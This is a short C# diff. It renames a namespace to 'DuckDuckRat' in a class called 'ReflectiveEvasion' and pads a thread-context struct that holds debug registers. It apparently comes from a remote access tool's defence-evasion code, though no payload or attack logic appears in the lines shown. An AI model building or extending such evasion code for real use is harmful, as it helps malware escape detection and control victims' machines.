@@ -3,7 +3,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Runtime.CompilerServices;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static unsafe class ReflectiveEvasion
     {
@@ -100,6 +100,8 @@ namespace VanguardCore
             public uint EFlags;
             public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
             public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
+            // Pad out to 1232 bytes to prevent stack corruption by GetThreadContext
+            public unsafe fixed byte Padding[1024];
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -110,3 +112,5 @@ namespace VanguardCore
         #endregion
     }
 }
+
+
